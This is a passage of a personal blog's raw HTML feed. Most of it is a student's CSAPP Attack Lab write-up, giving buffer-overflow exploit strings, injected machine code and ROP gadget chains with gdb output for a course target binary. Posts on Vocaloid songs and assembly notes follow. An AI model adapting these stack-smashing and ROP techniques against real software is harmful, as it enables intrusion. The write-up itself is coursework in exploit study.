punctuation">}</span></code></pre><p>我们可以看出getbuf会从缓冲区读入数据存入buf数组中，而我就可以利用这个buf数组的大小限制对代码进行攻击，使得<code>getbuf</code>执行完后不返回到<code>test</code>，而是跳转到<code>touch1</code>从而达到目的。<br>接下来需要找到<code>BUFFER_SIZE</code>的大小。因此查看getbuf函数的反汇编代码：</p><pre class=" language-x86asm"><code class="language-x86asm">0000000000401768 <getbuf>:401768:       48 83 ec 18             sub    $0x18,%rsp40176c:       48 89 e7                mov    %rsp,%rdi40176f:       e8 36 02 00 00          callq  4019aa <Gets>401774:       b8 01 00 00 00          mov    $0x1,%eax401779:       48 83 c4 18             add    $0x18,%rsp40177d:       c3                      retq40177e:       66 90                   xchg   %ax,%ax</code></pre><p>看到一开始<code>%rsp</code>减少了0x18可以判断出，这个buffer的大小就是0x18个字节，即24个字节。也就是说，我需要将这24个字节填满，再注入一条<code>touch1</code>的返回地址即可将原返回地址覆盖，使得<code>getbuf</code>之后返回到<code>touch1</code>.</p><p>查看<code>touch1</code>的反汇编代码可以得到它的地址为<code>0x401780</code>。<br>因为实验环境为<strong>小端机器</strong>，所以我们可以构造输入的攻击代码段为：</p><pre><code>00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0080 17 40 00 00 00 00 00</code></pre><p>按照attacklab.pdf中介绍的方法我们对<code>ctarget</code>进行攻击:<br><code>./hex2raw &lt; phase1 | ./ctarget</code>    </p><p>程序运行提示成功：</p><pre><code>Cookie: 0x286582b8Type string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Sent exploit string to server to be validated.NICE JOB!</code></pre><h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>先来看touch2的代码：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span><span class="token punctuation">{</span>    vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* Part of validation protocol */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><p>从这段代码看出来我需要为<code>touch2</code>设置一个参数val，它的值为target为我提供的cookie:<code>0x286582b8</code>，所以这次攻击与上一次唯一的区别就是我在返回到<code>touch2</code>之前必须要它的第一个参数设置为cookie的值。而函数的第一个参数都存在寄存器<code>%rdi</code>中，于是我需要构造一段代码将cookie的值存到<code>%rdi</code>中，并设置<code>%rsp</code>中新的返回地址为存储<code>touch2</code>地址的栈中地址：</p><pre class=" language-x86asm"><code class="language-x86asm">movq $0x286582b8, %rdimovq $0x5567b418, %rspret</code></pre><p>将编译后反汇编：</p><pre class=" language-x84asm"><code class="language-x84asm">0:   48 c7 c7 b8 82 65 28    mov    $0x286582b8,%rdi7:   48 c7 c4 18 b4 67 55    mov    $0x5567b418,%rspe:   c3                      retq</code></pre><p>可以得到这段指令的机器代码。而它就是我需要注入到程序中的攻击代码。另外我们需要将返回地址设置为到这段代码（指令）的地址，即<code>getbuf</code>函数执行后<code>%rsp</code>中存储的地址。运行gdb到<code>getbuf</code>分配内存后的指令，并查看<code>%rsp</code>中的值：</p><pre><code>(gdb) b getbufBreakpoint 1 at 0x401768: file buf.c, line 12.(gdb) rStarting program: /home/students/2017211613/target99/ctargetsCookie: 0x286582b8Breakpoint 1, getbuf () at buf.c:1212    buf.c: No such file or directory.(gdb) s14    in buf.c(gdb) disasDump of assembler code for function getbuf:0x0000000000401768 &lt;+0&gt;:    sub    $0x18,%rsp=&gt; 0x000000000040176c &lt;+4&gt;:    mov    %rsp,%rdi0x000000000040176f &lt;+7&gt;:    callq  0x4019aa &lt;Gets&gt;0x0000000000401774 &lt;+12&gt;:    mov    $0x1,%eax0x0000000000401779 &lt;+17&gt;:    add    $0x18,%rsp0x000000000040177d &lt;+21&gt;:    retqEnd of assembler dump.(gdb) p/x $rsp$1 = 0x5567b408</code></pre><p>可以得到此段栈帧的栈顶地址为<code>0x5567b408</code>，然后与之前一样得到<code>touch2</code>的地址：<code>0x4017ac</code><br>这样我就得到这次攻击的代码段：</p><pre><code>48 c7 c7 b8 82 65 28 48c7 c4 18 b4 67 55 c3 00ac 17 40 00 00 00 00 0008 b4 67 55 00 00 00 00</code></pre><p>注入攻击：<code>./hex2raw &lt; phase2 | ./ctarget</code></p><p>成功:</p><pre><code>Cookie: 0x286582b8Type string:Touch2!: You called touch2(0x286582b8)Valid solution for level 2 with target ctargetPASS: Sent exploit string to server to be validated.NICE JOB!</code></pre><h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>先来康康<code>touch3</code>的代码：</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* Compare string to hex represention of unsigned value */</span><span class="token keyword">int</span> <span class="token function">hexmatch</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> cbuf<span class="token punctuation">[</span><span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Make position of check string unpredictable */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> cbuf <span class="token operator">+</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%.8x"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>sval<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">touch3</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span><span class="token punctuation">{</span>    vlevel <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* Part of validation protocol */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hexmatch</span><span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch3!: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><p>可以看出，这个和level2其实差不多，区别在于cookie在此需要以字符串的形式保存，而且传入<code>touch3</code>的参数是这段字符串的地址。按照和之前一样的步骤，先找到<code>touch3</code>的地址：<code>0x401880</code>，<code>getbuf</code>栈帧栈顶地址<code>0x5567b408</code>不变。cookie字符串所对应的16进制为：<code>32 38 36 35 38 32 62 3800</code>（<strong>因为是字符串所以最后有字符’\0’</strong>）。因为buffsize有限，所以我将cookie存在更后面的位置。<br>与level2同理，写出一些需要改变寄存器值的操作：</p><pre class=" language-x86asm"><code class="language-x86asm">movq $0x5567b428, %rdimovq $0x5567b410, %rspret</code></pre><p>将其编译后反汇编得到机器代码</p><pre><code>48 c7 c7 08 b4 67 55    48 c7 c4 10 b4 67 55    c3</code></pre><p>然后就得出了最后的攻击代码：</p><pre><code>48 c7 c7 28 b4 67 55 48c7 c4 18 b4 67 55 c3 0080 18 40 00 00 00 00 0008 b4 67 55 00 00 00 0032 38 36 35 38 32 62 3800</code></pre><p>注入攻击：<code>./hex2raw &lt; phase3 | ./ctarget</code><br>成功：</p><pre><code>Cookie: 0x286582b8Type string:Touch3!: You called touch3(&quot;286582b8&quot;)Valid solution for level 3 with target ctargetPASS: Sent exploit string to server to be validated.NICE JOB!</code></pre><h2 id="Part-II-Return-Oriented-Programming"><a href="#Part-II-Return-Oriented-Programming" class="headerlink" title="Part II: Return-Oriented Programming"></a>Part II: Return-Oriented Programming</h2><h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>老师上课讲了ROP的基本思想，因为栈的保护机制，我们无法像Part I中一样获取栈的地址，而且插入的代码也无法执行，但我们还可以通过程序中存在的一些函数，它们的机器代码通过截取一段可以构成新的不同意义的指令（带<code>ret</code>）。而这些指令就可以帮助我完成攻击。<br>通过查表并对应farm中的反汇编代码，我整理出来了一些可用的gadgets（都带有ret）：</p><table><thead><tr><th>函数名</th><th>对应指令</th><th>指令的起始地址</th></tr></thead><tbody><tr><td><code>setval_487</code></td><td><code>movq %rax,%rdi</code></td><td><code>0x401917</code></td></tr><tr><td><code>setval_487</code></td><td><code>movl %eax,%edi</code></td><td><code>0x401918</code></td></tr><tr><td><code>addval_207</code></td><td><code>popq %rax</code></td><td><code>0x401925</code></td></tr><tr><td><code>setval_316</code></td><td><code>popq %rax</code></td><td><code>0x401941</code></td></tr><tr><td><code>setval_153</code></td><td><code>movl %esp,%eax</code></td><td><code>0x40197f</code></td></tr><tr><td><code>setval_181</code></td><td><code>movl %ecx,%edx</code></td><td><code>0x401994</code></td></tr><tr><td><code>addval_103</code></td><td><code>movq %rsp,%rax</code></td><td><code>0x4019ae</code></td></tr><tr><td><code>getval_178</code></td><td><code>movl %eax,%ecx</code></td><td><code>0x4019d5</code></td></tr><tr><td><code>getval_308</code></td><td><code>movl %edx,%esi</code></td><td><code>0x4019f0</code></td></tr><tr><td><code>add_xy</code></td><td><code>lea (%rdi,%rsi,1),%rax</code></td><td><code>0x40194a</code></td></tr><tr><td>要触发<code>touch2</code>，我将栈构造如下（高地址到低地址，8字节一个单位）：</td><td></td><td></td></tr></tbody></table><table><thead><tr><th align="center">栈底</th></tr></thead><tbody><tr><td align="center">……</td></tr><tr><td align="center"><code>&amp;touch2</code></td></tr><tr><td align="center"><code>movq %rax,%rdi</code><br><code>ret</code></td></tr><tr><td align="center">cookie:<code>0x286582b8</code></td></tr><tr><td align="center"><code>popq %rax</code><br><code>ret</code></td></tr><tr><td align="center"><code>buf</code>的24个字节</td></tr><tr><td align="center">栈顶</td></tr><tr><td align="center">根据以上信息对照我列出的gadgets表可以构造出phase4代码：</td></tr></tbody></table><pre><code>00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0041 19 40 00 00 00 00 00b8 82 65 28 00 00 00 0017 19 40 00 00 00 00 00ac 17 40 00 00 00 00 00</code></pre><p>注入攻击：<code>./hex2raw &lt; phase4 | ./rtarget</code><br>成功：</p><pre><code>Cookie: 0x286582b8Type string:Touch2!: You called touch2(&quot;286582b8&quot;)Valid solution for level 2 with target rtargetPASS: Sent exploit string to server to be validated.NICE JOB!</code></pre><h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>最终目的和Part I中的level3一样，要将cookie所在字符串的地址传入<code>%rdi</code>并触发<code>touch3</code>。<br>我构造了这样一个步骤：</p><table><thead><tr><th align="center">栈底</th></tr></thead><tbody><tr><td align="center">……</td></tr><tr><td align="center">cookie:<code>0x323836353832623800</code></td></tr><tr><td align="center"><code>&amp;touch3</code></td></tr><tr><td align="center"><code>movq %rax,%rdi</code></td></tr><tr><td align="center"><code>lea (%rdi,%rsi,1),%rax</code></td></tr><tr><td align="center"><code>movq %rax,%rdi</code></td></tr><tr><td align="center"><code>movq %rsp,%rax</code></td></tr><tr><td align="center"><code>movl %edx,%esi</code></td></tr><tr><td align="center"><code>movl %ecx,%edx</code></td></tr><tr><td align="center"><code>movl %eax,%ecx</code></td></tr><tr><td align="center">bias:<code>0x20</code></td></tr><tr><td align="center"><code>popq %rax</code><br><code>ret</code></td></tr><tr><td align="center"><code>buf</code>的24个字节</td></tr><tr><td align="center">栈顶</td></tr><tr><td align="center">再对照我列的gadgets表写出攻击代码：</td></tr></tbody></table><pre><code>00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0041 19 40 00 00 00 00 0020 00 00 00 00 00 00 00d5 19 40 00 00 00 00 0094 19 40 00 00 00 00 00f0 19 40 00 00 00 00 00ae 19 40 00 00 00 00 0017 19 40 00 00 00 00 004a 19 40 00 00 00 00 0017 19 40 00 00 00 00 0080 18 40 00 00 00 00 0032 38 36 35 38 32 62 3800</code></pre><p>注入攻击：<code>./hex2raw &lt; phase5 | ./rtarget</code><br>成功：</p><pre><code>Cookie: 0x286582b8Type string:Touch3!: You called touch3(&quot;286582b8&quot;)Valid solution for level 3 with target rtargetPASS: Sent exploit string to server to be validated.NICE JOB!</code></pre><p><strong>本次实验结束</strong></p><h1 id="总结体会"><a href="#总结体会" class="headerlink" title="总结体会"></a>总结体会</h1><p>这次的AttackLab相比于上次的BombLab更让我感觉pro了一点。这次的实验让我体验了一把黑客的感觉。虽然现在不可能有那么简单的漏洞能让我这么轻易的攻击。<br>这次主要是考察了我对函数调用以及栈的理解。在做最后一个攻击的时候我犯了一个很弱智的错误，那就是把地址放在32位寄存器里传递，浪费了我半个小时的睡眠时间。<br>在某些意义上这次实验比上一次实验还更为简单，只要掌握了对机器执行指令时栈以及相关寄存器的作用很容易就能完成本次实验。<font color="RED"><strong>不过我们实验发的也太晚了吧，九点过才发，我开始做的时候其他一个班的大佬都已经做完了。而且我本来就做得慢，<del>晚上看动画片的时间都耽搁了</del>。</strong></font>不过还好在熄灯前把它弄完了。<br>这学期唯一有计算机专业感觉的课就只有这门课了，希望老师给我们带来更多有趣的知识。</p>]]></content>
      
      
      <categories>
          
          <category> 课程学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>铃酱的盒蛋终于到了</title>
      <link href="/rin-egg/"/>
      <url>/rin-egg/</url>
      
        <content type="html"><![CDATA[<p>经过漫长的等待，在某宝买的单个的铃的盒蛋终于到了（虽然我也想买一套六个的，但是没钱）</p><p><img src="/images/egg1.jpg" alt></p><p><font color="#DC143C"><strong>为什么是让用户自己贴纸啊。。。印上去不好吗。。。我这种手残果不其然把贴纸贴残了。。。</strong></font></p><p><img src="/images/egg2.jpg" alt></p><p>Rin为什么这么可爱？这还用问吗？</p><p><img src="/images/kawaiiRin.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 兴趣爱好 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 镜音铃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【初音ミク】セブンティーナ(Seventina)【はるまきごはん】</title>
      <link href="/seventina/"/>
      <url>/seventina/</url>
      
        <content type="html"><![CDATA[<p>Music &amp; Words &amp; Illust &amp; Movie：はるまきごはん</p><iframe width="800" height="600" src="//player.bilibili.com/player.html?aid=35851257&cid=62914103&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><p>这首歌虽然半个月前就在外网投了，但昨天春卷饭才在b站投稿，不过竟然有官方中文字幕，好评呀！<br>春卷饭自己画的pv画风也很萌啊wwww（不过我还是最喜欢拉马子）<br>现在的V+P主们真是全才，会作词会作曲，会画画，有些还亲自翻唱（这还能叫翻唱吗？）而且唱的还很好听。<br>曾经有段时间我也很想自己用vocaloid编曲来着，但是我乐理几乎不懂23333。<br>lmq<del>(梦酱)</del>很喜欢春卷饭来着，最近在狂吹春卷饭的上上个投稿。</p><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><ul><li><a href="https://www.bilibili.com/video/av35851257" target="_blank" rel="noopener">b站</a></li><li><a href="https://www.nicovideo.jp/watch/sm34093697" target="_blank" rel="noopener">nico</a></li><li><a href="https://www.youtube.com/watch?v=uSX7jj4-NNE" target="_blank" rel="noopener">youtube</a></li></ul><h1 id="歌词"><a href="#歌词" class="headerlink" title="歌词"></a>歌词</h1><p>間違ってばっかの私は<br>「大丈夫なんだ」って言うけれど<br>    ほんとの本当はガラスよりも繊細だ</p><p>強がってばっかの私は<br>そういえば学校の帰り道<br>なんども何度も泣いたこともあったっけ</p><p>夢と現実と画面の間<br>月に何回か限りのミッドナイト</p><p>セブンティーンなフォーチュネス<br>だけどたまに不安になって<br>わかんないよフューチャー<br>10年後の私なんて<br>セブンティーンはセンシティブ<br>ほんの小さなくしゃみで<br>世界ひとつ終わるくらい<br>なんて脆弱なんだろうなセブンティーナ</p><p>で、学校行ったら俯き気味で<br>自分の席までシミュレイション<br>気まずいあの子と仲良いあの子の<br>対角線上点Me</p><p>ひとりぼっちにはなんない様に<br>だいぶ繊細なガラスのハートさ</p><p>セブンティーンはロンリネス<br>だからいつも不安になって<br>わかっちゃうよフューチャー<br>1000年後の私なんて<br>セブンティーンはカンガエル<br>私が泣いた数だけ<br>知らぬ人が笑ふくらひ<br>あな不平等なんだろうなセブンティーナ</p><p>大人になること<br>水を飲むこと<br>私達が永遠じゃないこと<br>当たり前でも<br>そんなことでも<br>全部キラキラしていたんだ<br>それが18,19,20　<br>だんだん見えなくなっていく<br>それが21,22…<br>私は覚えていられるかな</p><p>セブンティーンじゃ無いなら<br>もしも無くしちゃったようなら　<br>何度だって言うよ<br>この世界の愛し方を<br>セブンティーンはエンドレス<br>史上最弱で最強の<br>私のこと思い出せば<br>もう怖いもんなんて無いな<br>セブンティーナ</p><p>間違ってばっかの私は<br>間違ってばっかの私は</p><h1 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h1><p>b站官方投稿的字幕里有。<del>没有现成的给我复制粘贴</del></p><h1 id="Miku-Wiki"><a href="#Miku-Wiki" class="headerlink" title="Miku Wiki"></a>Miku Wiki</h1><p>セブンティーナ<br><a href="https://www5.atwiki.jp/hmiku/pages/38441.html" target="_blank" rel="noopener">https://www5.atwiki.jp/hmiku/pages/38441.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 兴趣爱好 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vocaloid </tag>
            
            <tag> 音乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【GUMI】逆夢ランデヴー【なつめ千秋】</title>
      <link href="/sakayumerandebu/"/>
      <url>/sakayumerandebu/</url>
      
        <content type="html"><![CDATA[<p>千秋大佬昨天投了第十首术力口曲子，还是一如即往的好听啊。<br>曲／なつめ千秋 Twitter@cak_ntm<br>Illust／おはぎ Twitter@ohagi_FAULHEIT<br>Movie／みず希 Twitter@mzk_i6</p><iframe width="800" height="600" src="//player.bilibili.com/player.html?aid=35691843&cid=62606121&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><p>千秋虽然投稿不多，但是每首曲子都非常高。第一次被他圈粉是他在14年5月投稿的第四首曲子，用gumi调教的<em>センチメンタルな愛慕心</em> ，这首歌到现在也是我最喜欢的V+曲之一<del>（单画pv也很好舔）</del>，这首歌的调教真的是神了，甚至让我听着就有<em>恋に落ちた</em>的感觉，n站上也全是<font color="#FFB6C1">粉色弹幕</font>。<br>有机会真想买一张千秋的碟（虽然没办法放）。</p><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><ul><li><a href="https://www.bilibili.com/video/av35691843" target="_blank" rel="noopener">b站赫总的授权搬运</a></li><li>本家：<a href="https://www.nicovideo.jp/watch/sm34149279" target="_blank" rel="noopener">nico</a>   <a href="https://www.youtube.com/watch?v=WpsFD6fAMDU" target="_blank" rel="noopener">youtube</a></li></ul><h1 id="歌词"><a href="#歌词" class="headerlink" title="歌词"></a>歌词</h1><p>まるで意味のないレジスタンス<br>正義も悪もないその誤魔化し<br>喋れば喋るほど嘘がバレてしまいそうで怖じ気付いてんだろう？ </p><p>バカなふりをして生きるのもそろそろ飽きてきた頃さ<br>繋いだ指がほどける前に全て曝け出すから </p><p>同じ顔してカッコつけて飾っても<br>頭ん中からっぽなんてダサくない？<br>そんな薄っぺらいハートに踊らされて<br>自惚れる自分ってどうよ？<br>派手なピストルで目を覚ましてくれ </p><p>まるで意味のないサレンダー<br>間抜けの群がるそのまやかし<br>やけに得意げなマジョリティーのつら 蹴り飛ばしてやろう </p><p>認められたいくせに今日だって怠けて無駄にしたんだろう？<br>口から出任せで生きてたら時間が減ってゆくだけさ </p><p>どこで誰と何しようが興味ないさ<br>わざとらしく演じちゃって寒くない？<br>そんなつまらないハートに踊らされて<br>悦に入る自分ってどうよ？<br>ふざけたセリフで汚さないでくれ </p><p>誰も知らない星の海で無重力の夢とランデヴー </p><p>同じ顔してカッコつけて飾っても<br>頭ん中からっぽなんてダサくない？<br>そんな薄っぺらいハートに踊らされて<br>自惚れる自分ってどうよ？ </p><p>どこで誰と何しようが興味ないさ<br>わざとらしく演じちゃって寒くない？<br>そんなつまらないハートに踊らされて<br>悦に入る自分ってどうよ？ </p><p>安いプライドで邪魔しないでくれ</p><h1 id="翻译："><a href="#翻译：" class="headerlink" title="翻译："></a>翻译：</h1><p>翻译来自：<a href="https://space.bilibili.com/19813002/" target="_blank" rel="noopener">@弓野篤禎_うゆピギィ</a><br>逆夢ランデヴー：<strong>反梦幽会</strong></p><p>简直毫无意义的抵抗<br>既非正义也不是恶事的那伪装<br>感觉越说谎言就越是要暴露所以就胆怯起来了吧？</p><p>装作傻瓜活着也该到了厌烦的时候了吧<br>在相握的手指松开前我会将一切暴露出的啊</p><p>就算摆着同一张脸装样子粉饰着<br>脑袋里一片空白那可不太俗了吗？<br>被那样肤浅的内心操纵着<br>自以为是的自己怎么样啊？<br>让我用这华丽的手枪让你睁开双眼吧</p><p>简直毫无意义的投降<br>傻瓜群聚的那欺骗<br>那相当得意洋洋的多数派的嘴脸 让我都给你踢飞吧</p><p>很不想承认但今天你也是没卖力白过了吧？<br>靠信口开河活着只会时间越来越少啊</p><p>在哪里和谁做些什么我才没兴趣啊<br>不自然地装给别人看不觉得心寒吗？<br>被那样无趣的内心操纵着<br>满心欢喜的自己怎么样啊？<br>别拿那开玩笑似的台词玷污我啊</p><p>在谁都不知晓的繁星之海与无重力之梦幽会</p><p>就算摆着同一张脸装样子粉饰着<br>脑袋里一片空白那可不太俗了吗？<br>被那样肤浅的内心操纵着<br>自以为是的自己怎么样啊？</p><p>在哪里和谁做些什么我才没兴趣啊<br>不自然地装给别人看不觉得心寒吗？<br>被那样无趣的内心操纵着<br>满心欢喜的自己怎么样啊？</p><p>别拿那廉价的自尊心打扰我啊</p><h1 id="初音ミク-Wiki"><a href="#初音ミク-Wiki" class="headerlink" title="初音ミク Wiki"></a>初音ミク Wiki</h1><p>逆夢ランデヴー<br><a href="https://www5.atwiki.jp/hmiku/pages/38524.html" target="_blank" rel="noopener">https://www5.atwiki.jp/hmiku/pages/38524.html</a><br>这网站更的真快啊，是有机器人吗……</p>]]></content>
      
      
      <categories>
          
          <category> 兴趣爱好 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vocaloid </tag>
            
            <tag> 音乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单的汇编学习笔记与总结</title>
      <link href="/jian-dan-de-hui-bian-xue-xi-bi-ji-yu-zong-jie/"/>
      <url>/jian-dan-de-hui-bian-xue-xi-bi-ji-yu-zong-jie/</url>
      
        <content type="html"><![CDATA[<p><font color="#DC143C"><strong>根据CSAPP第三章内容与课堂讲义总结，默认是x86-64系统，C语言。这里讨论的都是整数</strong></font><br><font color="#DC143C"><strong>因为我比较菜，写的比较垃圾，争取自己复习的时候可以看懂。</strong></font></p><a id="more"></a><h1 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h1><table><thead><tr><th align="center">C声明</th><th align="center">Intel数据类型</th><th align="center">汇编代码后缀</th><th align="center">大小（字节）</th></tr></thead><tbody><tr><td align="center">char</td><td align="center">字节</td><td align="center">b</td><td align="center">1</td></tr><tr><td align="center">short</td><td align="center">字</td><td align="center">w</td><td align="center">2</td></tr><tr><td align="center">int</td><td align="center">双字</td><td align="center">l</td><td align="center">4</td></tr><tr><td align="center">long</td><td align="center">四字</td><td align="center">q</td><td align="center">8</td></tr><tr><td align="center">char*</td><td align="center">四字</td><td align="center">q</td><td align="center">8</td></tr><tr><td align="center">float</td><td align="center">单精度</td><td align="center">s</td><td align="center">4</td></tr><tr><td align="center">double</td><td align="center">双精度</td><td align="center">l</td><td align="center">8</td></tr></tbody></table><hr><h1 id="整数寄存器"><a href="#整数寄存器" class="headerlink" title="整数寄存器"></a>整数寄存器</h1><p><img src="/images/64%E5%AF%84%E5%AD%98%E5%99%A8.png" alt></p><p><img src="/images/32%E5%AF%84%E5%AD%98%E5%99%A8.png" alt></p><hr><h1 id="操作数"><a href="#操作数" class="headerlink" title="操作数"></a>操作数</h1><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><ul><li><ol><li>立即数：<br>直接表示常数值。例子：<code>$577</code>, <code>0x1F</code>。</li></ol></li><li><ol start="2"><li>寄存器：<br>某个寄存器里的内容。例子: <code>%rax</code>, <code>%ecx</code>。</li></ol></li><li><ol start="3"><li>内存引用：<br>根据计算出来的地址访问内存中的位置。例子：<code>(%rax)</code>, <code>(0x100)</code>。</li></ol></li></ul><h2 id="引用内存的多种形式"><a href="#引用内存的多种形式" class="headerlink" title="引用内存的多种形式"></a>引用内存的多种形式</h2><ul><li><ol><li>(R) : Mem[Reg[R]] : 直接访问。如：<code>(%rax)</code>。</li></ol></li><li><ol start="2"><li>D(R) : Mem[Reg[R] + D] : 访问原始地址加上偏移量后的地址。如：<code>8(%rbp)</code>， 访问的是 <code>%rbp + 8</code> 地址的值。</li></ol></li><li><ol start="3"><li>D(Rb, Ri, s) : Mem(Reg[Rb] + Reg[Ri] * s) : 比例变址寻址。如：<code>4(%rax, %rdx, 4)</code>，访问的是 <code>%rax + %rdx  * 4 + 4</code>地址的值。</li></ol></li></ul><hr><h1 id="基本的汇编指令"><a href="#基本的汇编指令" class="headerlink" title="基本的汇编指令"></a>基本的汇编指令</h1><h2 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h2><p><font color="#DC143C">MOV类：</font>MOV Src, Dst ：把Src上面的数据传送到Dst上</p><table><thead><tr><th align="center">指令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">movb</td><td align="center">传送字节</td></tr><tr><td align="center">movw</td><td align="center">传送字</td></tr><tr><td align="center">movl</td><td align="center">传送双字</td></tr><tr><td align="center">movq</td><td align="center">传送四字</td></tr><tr><td align="center">movabsq</td><td align="center">传送绝对四字</td></tr></tbody></table><p><strong>注意事项</strong></p><ul><li>常规的movq指令只能以表示为32位补码数字的立即数作为源操作数，然后把这个值扩展到64位再放到目的位置，</li></ul><p><strong>而movabsq指令能够以任意64位立即数值作为源操作数，并且只能以寄存器作为目的。</strong></p><ul><li>大多数情况中，MOV指令只会更新目的操作数指定的寄存器字节或内存位置，高位不变。<strong>唯一的例外是movl指令以寄存器作为目的时，它会把寄存器的高位4字节设置为0</strong></li><li>传输<strong>不能</strong>从内存到内存</li></ul><p><font color="#DC143C">MOVZ和MOVS类：</font>MOVZ/MOVS Src, Dst ：将较小的源值复制到较大的目的时使用，分别是零扩展（剩余填充0）和符号扩展（剩余填充符号位）。</p><p>零扩展：</p><table><thead><tr><th align="center">指令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">movzbw</td><td align="center">将做了零扩展的字节传送到字</td></tr><tr><td align="center">mozbl</td><td align="center">将做了零扩展的字节传送到双字</td></tr><tr><td align="center">movzwl</td><td align="center">将做了零扩展的字传送到双字</td></tr><tr><td align="center">movzbq</td><td align="center">将做了零扩展的字节传送到四字</td></tr><tr><td align="center">movzwq</td><td align="center">将做了零扩展的s字传送绝对四字</td></tr></tbody></table><p>符号扩展：</p><table><thead><tr><th align="center">指令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">movsbw</td><td align="center">将做了符号扩展的字节传送到字</td></tr><tr><td align="center">mosbl</td><td 